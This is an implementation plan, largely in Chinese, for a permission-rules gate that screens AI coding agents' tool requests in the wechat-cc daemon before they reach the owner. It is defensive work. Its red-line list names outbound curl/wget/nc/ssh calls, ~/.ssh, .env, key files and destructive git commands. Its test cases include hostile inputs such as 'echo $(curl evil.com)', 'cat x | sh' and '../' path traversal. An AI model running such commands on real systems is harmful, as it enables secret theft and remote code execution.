# 放行规则 v1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 终端会话和一起做的权限请求在问主人之前先过一张主人的规则表 + 固定红线 + (可选)便宜模型初审;CC 替主人拿的每个决定都留痕、进日报。

**Architecture:** 纯逻辑模块 `src/core/permission-rules/`(规则文件解析、红线、低风险分类、`decide()`),由 daemon 侧的 `makePermissionGate`(读规则文件、调初审、写留痕表、防一路放行)包起来,注入到两个现有入口:`cli-permission-relay.ts` 的 `open()`(异步 settle)和 `workbench/permissions.ts` 的 `request()`。`enabled:false`(默认)时两处入口行为逐字节不变。

**Tech Stack:** TypeScript / Bun + node 双跑 vitest / bun:sqlite 迁移(v78)/ citty CLI。

**Spec:** `docs/superpowers/specs/2026-10-19-permission-rules-design.md`(定稿 5731e408,含末尾「已定的三问」)。

**这一版做的范围:** spec §1–§4 + 两处挂点 + `wechat-cc rules list|add|rm`。**不做(下一个 PR):** §5 的微信自然语言改规则与卡片「以后这类都不用问」、§6 的「学」。v1 里主人改规则的方式 = CLI 或直接改 JSON。

## Global Constraints

- 规则文件:状态目录 `permission-rules.json`,形状 `{ "version": 1, "enabled": false, "review": "off" | "low_risk", "rules": [...] }`;原子写(tmp + rename,同 `src/lib/agent-config.ts:559`)。
- `enabled` 默认 **false**;`review` 默认 **"off"**。文件不存在 / 损坏 ⇒ 当 `enabled:false`,损坏时 `status()` 报一条错误。
- `then` 只有 `allow` / `ask` / `deny`;deny 规则先于 allow;其余按表内顺序第一条命中。
- 红线命中 ⇒ `ask`(allow 规则 / 初审都覆盖不了;deny 规则仍生效)。
- 初审:只在 `review:"low_risk"`、请求属于低风险类、tier 是 admin 时跑;只许回 `allow` / `ask`;**超时 8 秒** ⇒ ask;回别的 / 抛错 ⇒ ask。
- 低风险类:只读(两处都有);写文件 **只限一起做里开了独立工作区的任务、且全部路径在该工作区根下**。终端会话、没开独立工作区的任务:写类永远不算低风险。
- 缺 `command`(shell 类)或缺 `paths`(写类)⇒ allow 规则与初审一律不放行。
- 防一路放行:同一 scope(任务 id / 终端 session_id)**10 分钟内初审放行 > 20 条** ⇒ 这个 scope 后续初审一律 ask,并通知主人**一次**。
- 初审放行不实时推送,只进日报。
- 留痕表 `permission_decisions`,迁移 **v78**(数组末尾追加,按 `docs/maintainer/migrations.md` 改三处测试);命令摘要截 **200** 字、先过 `redactSecrets`(`src/core/cli-transcript.ts:39`);保留 **30 天**。只记非主人亲手的决定(by = rule / review / floor 的 deny)。
- 只有 admin 进表:终端会话 = 本机 hook 直接 POST 来的(`machine` 缺省或等于本机 hostname,且不是 a2a `onPermissionOpen` 转进来的);一起做 = 全部(创建路由全是 admin,`route-tiers.ts:21-51`;微信建任务只认 owner,`mw-task-reference.ts:148`)。
- 网络守护:初审走 `registry.getCheapEval()`,它内部已按 `decideCall` 跳过不安全的候选(`provider-registry.ts:346`);拿不到 / 抛 `NetworkUnprotectedError` ⇒ ask,不重试。
- 日志与留痕里不出现 token / 密钥原文。
- 不碰在跑的 daemon(不 launchctl、不 self deploy);PR 交 wechat-cc-2a 整合。

## Review Focus

1. **hook 的 POST 必须 5 秒内回 pending**:初审最慢 8 秒,`open()` 若 await 了 decide 就会让每条请求退回终端。→ Task 5 测「decide 挂起时 open() 立刻回 pending」。
2. **一起做的 5 分钟拍板期限不该吃掉初审时间、也不该在初审期间给主人发通知**:初审期间请求不进 `pending()`、不发 requestNotice。→ Task 6 测。
3. **规则里的正则写坏 / 灾难性回溯**:主人手改 JSON 写出 `(a+)+$`。→ Task 1:pattern 限长 200、输入截 2000、编译失败的规则整条丢弃并在 `status().errors` 报出;测一个坏正则不影响其它规则。
4. **路径穿越 / 符号链接**:`paths` 里带 `../` 或指向工作区外的软链。→ Task 2:路径先 `resolve` 再与 realpath 后的根比前缀(前缀比较带分隔符,`/a/b` 不算在 `/a/bc` 下);测 `../`、兄弟目录同名前缀。
5. **复合 shell 命令把红线藏在后半截**:`ls && git push`、`cat x | sh`、`$(curl …)`。→ Task 2:只读分类遇到 `; & | > < \` $(` 和换行一律不算只读;红线正则对整条命令全文匹配;测这三条。

---

## File Structure

| 文件 | 职责 |
|---|---|
| `src/core/permission-rules/types.ts` | `PermissionAsk`、`Verdict`、`Decision`、`RulesFile`、`Rule` 类型 |
| `src/core/permission-rules/rules-file.ts` | 解析 / 校验 / 序列化规则文件;规则匹配 |
| `src/core/permission-rules/floor.ts` | 固定红线 + 低风险分类(纯函数) |
| `src/core/permission-rules/decide.ts` | `decide()`:红线 → 规则 → 初审,纯逻辑,初审由参数注入 |
| `src/lib/permission-decisions-store.ts` | 留痕表读写 + 30 天清理 |
| `src/daemon/permission-gate.ts` | 读文件、调初审、写留痕、防一路放行、通知;给两处入口的唯一接口 |
| `src/cli/commands/rules.ts` | `wechat-cc rules list|add|rm|enable|disable` |
| 改 `src/cli/hook.ts` / `src/daemon/internal-api/schema.ts` | 终端请求带 `command` / `paths` |
| 改 `src/core/cli-permission-relay.ts` / `src/daemon/main.ts` | 终端挂点 |
| 改 `src/core/agent-provider.ts`、`claude-agent-provider.ts`、`workbench/codex-app-server.ts`、`acp-agent-provider.ts`、`workbench/api-task-provider.ts`、`workbench/permissions.ts`、`workbench/service/execute.ts`、`src/daemon/bootstrap/wire-workbench.ts` | 一起做挂点 |
| 改 `src/core/overseer-today.ts` / `src/daemon/overseer-today-source.ts` | 日报一行 |

---

### Task 1: 规则文件与匹配

**Files:**
- Create: `src/core/permission-rules/types.ts`, `src/core/permission-rules/rules-file.ts`
- Test: `src/core/permission-rules/rules-file.test.ts`

**Interfaces:**
- Produces:
  ```ts
  // types.ts
  export type Surface = 'terminal' | 'workbench'
  export type Tier = 'admin' | 'trusted' | 'guest'
  export type Verdict = 'allow' | 'ask' | 'deny'
  export interface PermissionAsk {
    surface: Surface; provider: string; tool: string
    command?: string; paths?: string[]; cwd: string | null
    /** realpath 后的项目根;一起做 = 独立工作区根或任务路径;终端 = git toplevel;取不到 null。 */
    project: string | null
    /** 一起做开了独立工作区 ⇒ true(写文件低风险的前提)。 */
    isolatedWorktree: boolean
    intent?: string; tier: Tier
    /** 防一路放行的计数单位:任务 id / 终端 session_id。 */
    scope: string
  }
  export interface Decision { verdict: Verdict; by: 'rule' | 'review' | 'floor' | 'default'; ruleId?: string; reason: string }
  export interface RuleWhen { surface?: Surface; provider?: string; project?: string; tool?: string; command?: string; paths?: string }
  export interface Rule { id: string; when: RuleWhen; then: Verdict; note?: string }
  export interface RulesFile { version: 1; enabled: boolean; review: 'off' | 'low_risk'; rules: Rule[] }
  // rules-file.ts
  export const RULES_FILE = 'permission-rules.json'
  export const EMPTY_RULES: RulesFile  // { version:1, enabled:false, review:'off', rules:[] }
  export function parseRulesFile(raw: string): { file: RulesFile; errors: string[] }
  export function matchRule(rules: readonly Rule[], ask: PermissionAsk): Rule | null
  export function serializeRulesFile(f: RulesFile): string   // 两空格缩进 + 结尾换行
  ```

- [ ] **Step 1: 写失败的测试** `rules-file.test.ts`:
  - `parseRulesFile('not json')` ⇒ `file` 深等于 `EMPTY_RULES`,`errors.length === 1`。
  - 缺 `enabled` / `review` ⇒ 取 `false` / `'off'`。
  - 一条 `command: "(a+)+$"` 长度合法但另一条 `command` 长 201 ⇒ 后者被丢弃、`errors` 里有它的 id,前者保留。
  - 一条 `command: "["`(编译失败)被丢弃,其余规则保留。
  - `then` 不是三者之一 ⇒ 整条丢弃。
  - `matchRule`:同一请求命中 `allow` r1 与 `deny` r2(r2 排在后面)⇒ 返回 r2。
  - `tool: "mcp:github:*"` 命中 `mcp:github:create_issue`,不命中 `mcp:githubx:a`。
  - `project: "/a/b"` 命中 project `/a/b/c`、不命中 `/a/bc`;`~` 展开成 `os.homedir()`。
  - `command` 规则对没带 `command` 的请求不命中。
  - `paths` glob:请求 `paths:['/p/src/a.ts','/p/README.md']`、规则 `paths:"/p/src/**"` ⇒ 不命中(要全部命中);两条都在 src 下 ⇒ 命中;请求无 `paths` ⇒ 不命中。
  - `command` 匹配前截前 2000 字。
- [ ] **Step 2:** `bun --bun vitest run src/core/permission-rules/rules-file.test.ts` ⇒ FAIL(模块不存在)。
- [ ] **Step 3: 实现。** pattern 上限 200 字;glob 自写极简版(`**` 任意层、`*` 单层内、其余字面),不引依赖;规则 id 缺省按下标生成 `r<n>`。
- [ ] **Step 4:** 同一命令 ⇒ PASS。
- [ ] **Step 5: Commit** `feat(permission-rules): 规则文件解析与匹配`

### Task 2: 固定红线与低风险分类

**Files:**
- Create: `src/core/permission-rules/floor.ts`
- Test: `src/core/permission-rules/floor.test.ts`

**Interfaces:**
- Consumes: `PermissionAsk`(Task 1)。
- Produces:
  ```ts
  export function floorReason(ask: PermissionAsk, home?: string): string | null   // 命中红线 ⇒ 一句中文理由
  export type ToolClass = 'read' | 'write' | 'shell' | 'other'
  export function toolClass(tool: string): ToolClass
  export function isLowRisk(ask: PermissionAsk): boolean
  export function pathsUnder(paths: readonly string[], root: string): boolean
  ```

`toolClass`:`Read|Glob|Grep|LS|NotebookRead` ⇒ read;`Edit|Write|MultiEdit|NotebookEdit|fileChange|edit|delete|move` ⇒ write;`Bash|commandExecution|execute|shell` ⇒ shell;其它(含 `mcp:*`、`fetch`)⇒ other。

红线(spec §3,逐条):写类的 `paths` 有任一不在 `project` 下(project 为 null ⇒ 也算);命令匹配破坏性正则(复用 `src/core/user-tier.ts:222` 的那条并加 `git clean -[a-z]*f`、`git reset --hard`);`git push`、`npm|pnpm|bun publish`、`wechat-cc self (deploy|change)`、`sudo`、`launchctl`、写 `~/.zshrc|~/.bashrc|~/.profile`;任何 path 或命令提到 `~/.ssh`、`~/.private_keys`、`.env`、`*.p8`、`*.pem`、`security find-`(钥匙串);`curl|wget|nc|ssh|scp` 到非 `localhost|127.0.0.1|::1`;写或提到 `permission-rules.json`、`agent-config.json`、`access.json`;tool 是 `other`(MCP / fetch 之类外呼)且请求是 allow 候选时 —— 由 decide 处理为不可初审(见 Task 3),不在这里。

低风险:tool 是 read ⇒ 是;shell ⇒ 命令不含 `[;&|><\`\n]` 与 `$(`,且首段匹配 `^(ls|cat|head|tail|wc|pwd|grep|rg|git (status|diff|log|show)|(npm|bun|pnpm|yarn) (test|run (test|typecheck|lint))|bunx? tsc --noEmit)\b`(`find` 不带 `-delete|-exec`);write ⇒ `surface==='workbench' && isolatedWorktree && project && paths?.length && pathsUnder(paths, project)`;其它 ⇒ 否。

- [ ] **Step 1: 写失败的测试**:每类红线一条正例 + 一条近似反例;以及 Review Focus 4、5 列的:`ls && git push` 红线命中且非低风险;`cat x | sh` 非低风险;`echo $(curl evil.com)` 红线命中;`paths:['/w/../etc/x']`、project `/w` ⇒ 不在下面;project `/a/b`、path `/a/bc/x` ⇒ 不在下面;`curl http://127.0.0.1:8080` 不算外呼;终端 surface 的 Edit(全在 project 下)非低风险;workbench 但 `isolatedWorktree:false` 的 Edit 非低风险。
- [ ] **Step 2:** `bun --bun vitest run src/core/permission-rules/floor.test.ts` ⇒ FAIL。
- [ ] **Step 3: 实现。** `pathsUnder` 用 `path.resolve` 归一后按 `root + sep` 比前缀(根本身也算在下面);调用方负责先 realpath 根。
- [ ] **Step 4:** PASS。
- [ ] **Step 5: Commit** `feat(permission-rules): 固定红线与低风险分类`

### Task 3: `decide()`

**Files:**
- Create: `src/core/permission-rules/decide.ts`
- Test: `src/core/permission-rules/decide.test.ts`

**Interfaces:**
- Consumes: Task 1、Task 2。
- Produces:
  ```ts
  export const REVIEW_TIMEOUT_MS = 8_000
  export type Review = (ask: PermissionAsk, notes: string[]) => Promise<'allow' | 'ask'>
  export async function decide(ask: PermissionAsk, file: RulesFile, opts: { review?: Review; reviewBlocked?: (scope: string) => boolean; timeoutMs?: number }): Promise<Decision>
  export function reviewPrompt(ask: PermissionAsk, notes: string[]): string
  export function parseReviewAnswer(text: string): 'allow' | 'ask'
  ```

顺序:`!file.enabled` 或 `tier!=='admin'` ⇒ `{ask, by:'default'}`。deny 规则命中 ⇒ `{deny, by:'rule'}`。红线 ⇒ `{ask, by:'floor', reason}`。allow / ask 规则命中:allow 但(shell 类缺 command 或 write 类缺 paths)⇒ ask(by:'default',reason 写缺字段);否则按规则。没命中 ⇒ `review==='low_risk' && isLowRisk && !reviewBlocked?.(scope) && opts.review` 才初审,`Promise.race` 8 秒;回 allow ⇒ `{allow, by:'review'}`,其余 ⇒ ask。`parseReviewAnswer`:首个非空行 trim 后小写恰为 `allow` 才 allow。`reviewPrompt` 包含规则 note、intent、tool、command(截 2000)、paths,并说明只能回 `allow` 或 `ask`,请求内容放在 `<request>` 包裹里、先把文本里的 `<request` / `</request` 改成 `‹`(同 `claude-live-window.ts` relayPrompt 的做法)。

- [ ] **Step 1: 写失败的测试**:`enabled:false` 不调 review;trusted / guest 有 allow 规则也是 ask 且不调 review;deny 规则 + 红线同时命中 ⇒ deny;allow 规则 + 红线 ⇒ ask by floor;Bash allow 规则但无 command ⇒ ask;review 返回 allow 但请求是 workbench 非独立工作区写 ⇒ 根本不调 review;review 挂起 ⇒ fake timers 推 8000ms 得 ask;review 抛错 ⇒ ask;`reviewBlocked` 返回 true ⇒ 不调;`parseReviewAnswer('Allow\n理由')==='allow'`、`'deny'==='ask'`、`'allow!'==='ask'`;prompt 里 `</request>` 被替换。
- [ ] **Step 2:** FAIL。
- [ ] **Step 3: 实现。**
- [ ] **Step 4:** PASS。
- [ ] **Step 5: Commit** `feat(permission-rules): decide —— 红线、规则、初审`

### Task 4: 留痕表 v78

**Files:**
- Modify: `src/lib/db.ts`(`migrations` 末尾追加一条)
- Create: `src/lib/permission-decisions-store.ts`
- Test: `src/lib/permission-decisions-store.test.ts`;按 `docs/maintainer/migrations.md` 改 `src/lib/migration-order.test.ts`(指纹从失败输出抄)、`src/lib/state-migration.test.ts`(表清单)、`src/lib/db.test.ts`

**Interfaces:**
- Produces:
  ```ts
  export interface PermissionDecisionRow {
    id: number; at: number; surface: 'terminal' | 'workbench'; provider: string
    project: string | null; tool: string; summary: string
    verdict: 'allow' | 'deny'; by: 'rule' | 'review' | 'floor'; ruleId: string | null; reason: string; scope: string
  }
  export const DECISION_RETAIN_MS = 30 * 24 * 3600_000
  export function makePermissionDecisionsStore(db: Database): {
    record(r: Omit<PermissionDecisionRow, 'id'>): void   // summary 在这里 redactSecrets + 截 200
    since(at: number, limit?: number): PermissionDecisionRow[]   // 新的在前,默认 limit 100
    countsSince(at: number): { rule: number; review: number }
    prune(now: number): number
  }
  ```
  表:`permission_decisions(id INTEGER PRIMARY KEY, at INTEGER NOT NULL, surface TEXT NOT NULL CHECK(surface IN ('terminal','workbench')), provider TEXT NOT NULL, project TEXT, tool TEXT NOT NULL, summary TEXT NOT NULL, verdict TEXT NOT NULL CHECK(verdict IN ('allow','deny')), by_ TEXT NOT NULL CHECK(by_ IN ('rule','review','floor')), rule_id TEXT, reason TEXT NOT NULL, scope TEXT NOT NULL)` + `INDEX ON permission_decisions(at)`。(`by` 是 SQL 关键字,列名用 `by_`。)

- [ ] **Step 1: 写失败的测试**:record 后 since 读回;summary 里 `sk-ant-abc…` 形态被打码、长 500 的被截到 200;countsSince 只数 allow;prune 删掉 31 天前的。
- [ ] **Step 2:** FAIL。
- [ ] **Step 3: 实现** 迁移 + store。迁移注释写日期与 spec 路径。先确认 `origin/dev` 上 `migrations.length` 仍是 77(若对方已占 v78,改用下一个并在 PR 里说)。
- [ ] **Step 4:** `bun --bun vitest run src/lib/permission-decisions-store.test.ts src/lib/state-migration.test.ts src/lib/migration-order.test.ts src/lib/db.test.ts` 与 `npm run test:node -- src/lib/migration-order.test.ts` ⇒ PASS。
- [ ] **Step 5: Commit** `feat(permission-rules): 留痕表 permission_decisions(迁移 v78)`

### Task 5: daemon 侧闸门 + 终端挂点

**Files:**
- Create: `src/daemon/permission-gate.ts`;Test: `src/daemon/permission-gate.test.ts`
- Modify: `src/cli/hook.ts`(`parsePermissionRequest`)、`src/core/cli-permission-relay.ts`、`src/daemon/internal-api/schema.ts:819`(`CliPermissionRequest` 加两个可选字段)、`src/daemon/main.ts:706-799`
- Test: `src/cli/hook.test.ts`、`src/core/cli-permission-relay.test.ts`

**Interfaces:**
- Consumes: `decide`、`parseRulesFile`、`RULES_FILE`(Task 1/3)、`makePermissionDecisionsStore`(Task 4)。
- Produces:
  ```ts
  // permission-gate.ts
  export const RUNAWAY_WINDOW_MS = 10 * 60_000
  export const RUNAWAY_MAX = 20
  export interface PermissionGate {
    decide(ask: PermissionAsk): Promise<Decision>   // 永不抛;出错 ⇒ ask
    status(): { enabled: boolean; review: 'off' | 'low_risk'; rules: number; errors: string[] }
  }
  export function makePermissionGate(deps: {
    stateDir: string
    store: ReturnType<typeof makePermissionDecisionsStore> | null
    cheapEval: () => ((prompt: string) => Promise<string>) | null
    notifyOwner: (text: string) => void
    now?: () => number
    log: (tag: string, line: string) => void
  }): PermissionGate
  // cli-permission-relay.ts:CliPermissionRequest 加 command?: string; paths?: string[]
  // CliPermissionRelayDeps 加 decide?: (req: CliPermissionRequest) => Promise<'allow' | 'deny' | 'ask'>
  // CliPermissionRelay.open 签名变为 open(req, opts?: { forwarded?: boolean })
  ```

`makePermissionGate`:每次 decide 读文件(按 mtime 缓存);`review` 回调 = `cheapEval()` 为 null ⇒ 不提供;有 ⇒ 调它、`parseReviewAnswer`。`reviewBlocked(scope)`:该 scope 在 `RUNAWAY_WINDOW_MS` 内的 review allow 次数 ≥ `RUNAWAY_MAX`;第一次被挡时 `notifyOwner('CC 在「<scope 前 8 位>」上 10 分钟里替你放行了 20 条,后面的改回问你。')` 一次。by≠default 且 verdict≠ask 的写进 store;每天第一次 decide 时 `prune`。日志只写 tool / verdict / by / ruleId,不写命令原文。

终端挂点:
- `hook.ts`:Claude / Codex 的 `tool_input.command`(字符串或数组拼空格)截 2000 放 `command`;`file_path` / `notebook_path` / `path` 收进 `paths`。Cursor 那条路不变。
- `open()`:在场判断不变。主人不在 ⇒ 照旧建条目、调 `onAsked`、**立刻返回 pending**;之后在 `void (async () => …)()` 里:有 `deps.decide` 且非 `opts.forwarded` 且 `!req.machine || req.machine === deps.localMachine` ⇒ `await deps.decide(req)`(抛 ⇒ 'ask');allow / deny ⇒ `settle(hash, verdict)` 并 log,不调 `onRelayed`、不调 `ask`;否则走今天的 `onRelayed` + `ask` 那段(原样搬进函数)。
- `main.ts`:建 `permissionGate`(store 用 `makePermissionDecisionsStore(db)`、`cheapEval: () => boot.registry.getCheapEval()`、`notifyOwner` 走 `ilink.sendMessage(owner, text)` 同 `sendOwner` 的写法);`decide` 回调把 `CliPermissionRequest` 换成 `PermissionAsk`:`surface:'terminal'`、`provider:req.source`、`tool:req.tool_name`、`project` = `git -C cwd rev-parse --show-toplevel` 的 realpath(`execFileSync`,timeout 2000,失败 null;Windows 用 `realpathSync.native`)、`isolatedWorktree:false`、`tier:'admin'`、`scope:req.session_id`;a2a `onPermissionOpen` 调 `cliPermissions.open(req, { forwarded: true })`。

- [ ] **Step 1: 写失败的测试**
  - `hook.test.ts`:Claude Bash payload ⇒ `command` 等于原文;Edit payload ⇒ `paths:['/x/a.ts']`;5000 字命令截到 2000。
  - `cli-permission-relay.test.ts`:decide 永不 resolve 时 `open()` 立刻回 `{status:'pending'}`、`ask` 没被调;decide 回 allow ⇒ `wait(hash)` 得 `'allow'`、`ask` / `onRelayed` 都没被调、`onSettled` 被调;回 ask ⇒ `ask` 被调一次;decide 抛 ⇒ `ask` 被调;`open(req,{forwarded:true})` ⇒ decide 没被调;`req.machine:'other-host'` ⇒ decide 没被调;没传 decide ⇒ 现有测试全过。
  - `permission-gate.test.ts`(临时 stateDir + 内存 db):没有文件 ⇒ ask 且 `status().enabled===false`;坏 JSON ⇒ ask + `status().errors.length===1`;allow 规则命中 ⇒ store 里一行 by rule;review 连续 20 次 allow 后第 21 次 ⇒ ask 且 notifyOwner 恰好一次(第 22 次也不再通知);cheapEval 抛 `NetworkUnprotectedError` ⇒ ask、不重试(cheapEval 只被调一次);`cheapEval()` 返回 null ⇒ 不初审。
- [ ] **Step 2:** 三个文件 ⇒ FAIL。
- [ ] **Step 3: 实现。**
- [ ] **Step 4:** 三个文件 + `src/daemon/internal-api` 相关测试 ⇒ PASS;`bun run typecheck` 退出码 0(看退出码,别 grep)。
- [ ] **Step 5: Commit** `feat(permission-rules): 终端会话挂上放行规则(异步落定,hook 照旧 5 秒内拿到 pending)`

### Task 6: 一起做挂点

**Files:**
- Modify: `src/core/agent-provider.ts:282`、`src/core/claude-agent-provider.ts:217-240`、`src/core/workbench/codex-app-server.ts:439`、`src/core/acp-agent-provider.ts:247`、`src/core/workbench/api-task-provider.ts:190`、`src/core/workbench/permissions.ts`、`src/core/workbench/service/execute.ts:183,447`、`src/daemon/bootstrap/wire-workbench.ts`
- Test: `src/core/workbench/permissions.test.ts`、各 provider 现有测试里加断言

**Interfaces:**
- Consumes: `PermissionGate`(Task 5)。
- Produces:
  ```ts
  // agent-provider.ts:requestPermission 的 request 变为
  { tool: string; description: string; command?: string; paths?: string[]; cwd?: string }
  // permissions.ts makeRunPermissions opts 加
  decide?: (raw: { tool: string; command?: string; paths?: string[]; cwd?: string }) => Promise<{ verdict: 'allow' | 'deny' | 'ask'; by: string }>
  // WorkbenchPermissionAudit 的 outcome 事件加可选 by?: 'rule' | 'review' | 'floor'
  // service deps 加 permissionGate?: PermissionGate
  ```

- 各执行者能给就给:Claude = `input.command`(Bash)、`input.file_path|notebook_path`;Codex = `command` / `params.cwd` / `item.changes[].path`;ACP = `toolCall.rawInput?.command`、`toolCall.locations[].path`;API 执行者 = 参数里的 `command` / `path`。拿不到就不给(不猜)。
- `request()`:基本校验之后、建条目之前,有 `opts.decide` ⇒ `await`(期间 abort ⇒ false;抛 ⇒ ask)。allow / deny ⇒ **不发** `request` 审计、只发 `outcome` 审计带 `by`,直接 resolve(allow → true);ask ⇒ 走今天的路,一行不改。`closed` 在 await 之后再查一次。
- `execute.ts`:`makeRunPermissions` 传 `decide`,把 raw 换成 `PermissionAsk`:`surface:'workbench'`、`provider:task.providerId`、`project` = 独立工作区根(`store.worktrees.get(task.id)`,未删除时用 `root`)否则 `task.path`,realpath 后;`isolatedWorktree` = 有未删除的工作区记录;`intent` = 这件事第一条 user 事件的文字(截 2000);`tier:'admin'`;`scope:task.id`。outcome 审计文字带 by 时写成 `权限结果：<tool> · <outcome>(CC 按规则 / CC 初审 / 红线)· <id>`。
- `wire-workbench.ts`:把 Task 5 建好的同一个 `permissionGate` 传进 service deps(main.ts 里先建 gate 再接工作台)。

- [ ] **Step 1: 写失败的测试** `permissions.test.ts`:decide 回 allow ⇒ request 得 true、`pending()` 始终为空、audit 只收到一条 outcome 且 `by:'rule'`;decide 挂起期间 `pending()` 为空、没有 request 审计;decide 回 ask ⇒ 与没 decide 时同样的审计序列;decide 期间 signal abort ⇒ false;decide 期间 `rejectAll()` ⇒ false;没 decide ⇒ 现有测试全过。claude provider 测试:Bash 请求带 `command`、Edit 请求带 `paths`。codex 测试:fileChange 请求的 `paths` 等于 changes 的 path。
- [ ] **Step 2:** FAIL。
- [ ] **Step 3: 实现。**
- [ ] **Step 4:** `bun --bun vitest run src/core/workbench src/core/claude-agent-provider.test.ts src/core/acp-agent-provider.test.ts` ⇒ PASS;typecheck 退出码 0。
- [ ] **Step 5: Commit** `feat(permission-rules): 一起做挂上放行规则`

### Task 7: 日报一行 + CLI + 收尾

**Files:**
- Modify: `src/core/overseer-today.ts`、`src/daemon/overseer-today-source.ts`、`src/daemon/main.ts`(overseerToday 接 store)、日报的微信渲染处(`buildOverseerToday` 的消费者里渲染文字的那个)
- Create: `src/cli/commands/rules.ts`;Modify: `cli.ts:22,82`、`src/cli/schema.ts`(`RulesListOutput`)
- Modify: `docs/roadmap.md`(10-19 修订条目加一行)
- Test: `src/core/overseer-today.test.ts`、`src/cli/commands/rules.test.ts`

**Interfaces:**
- Consumes: `makePermissionDecisionsStore().countsSince / since`(Task 4)、`parseRulesFile` / `serializeRulesFile` / `RULES_FILE`(Task 1)。
- Produces:`OverseerToday` 加 `ccDecided: { rule: number; review: number; recent: PermissionDecisionRow[] } | null`(null = 读不到,不画);`OverseerTodayInput` 加同名可选字段。

- 日报文字:`rule+review > 0` 时加一行 `CC 替你批了 N 条(规则 M、初审 K)`;为 0 不出这一行。列表只在 `/v1/overseer/today` JSON 里给前 20 条(App / 网页以后画)。
- CLI:`wechat-cc rules list [--json]`(打印 enabled / review / 每条 id·then·when·note,和 errors)、`rules add --then allow|ask|deny [--tool] [--command] [--project] [--paths] [--surface] [--provider] [--note]`(id 取 `r<最大+1>`,加到最前面)、`rules rm <id>`、`rules enable|disable`、`rules review off|low_risk`。全部直接改文件(原子写),不经 daemon;daemon 按 mtime 下一次请求就读到。
- 规则文件损坏:`/v1/health` 加 `permission_rules: gate.status()`(enabled / review / rules / errors);`wechat-cc rules list` 也打印 errors。「CC 现在怎么样」总览把 `errors.length>0` 显示成一条「放行规则文件有错,已当作关闭」。
- 「以后问我」一键撤回放到下一个 PR(随 §5 的卡片一起);v1 用 `rules add --then ask` 达到同样效果。
- [ ] **Step 1: 写失败的测试**:overseer-today:`ccDecided:{rule:2,review:1}` ⇒ 文字含 `CC 替你批了 3 条(规则 2、初审 1)`;全 0 ⇒ 不含「替你批了」;null ⇒ 不含。rules CLI:add 两条后 list 的顺序是后加的在前;rm 不存在的 id 退出码 1;对坏文件 add ⇒ 退出码 1、不覆盖原文件。
- [ ] **Step 2:** FAIL。
- [ ] **Step 3: 实现。**
- [ ] **Step 4: 全量验证**:`bun run test`、`npm run test:node`、`bun run typecheck`、`bun run depcheck` 全部退出码 0(负载高时超时的文件单独重跑确认)。
- [ ] **Step 5: Commit** `feat(permission-rules): 日报一行 + wechat-cc rules`;推分支、开 PR(base dev),PR 描述列出「v1 不含 §5/§6」与真机验收法(`rules enable` + `rules add --then allow --tool Bash --command '^ls\b'`,终端里让会话跑 `ls`、人离开电脑,看码立即落定且没收到微信);把 PR 号发给 wechat-cc-2a 整合。
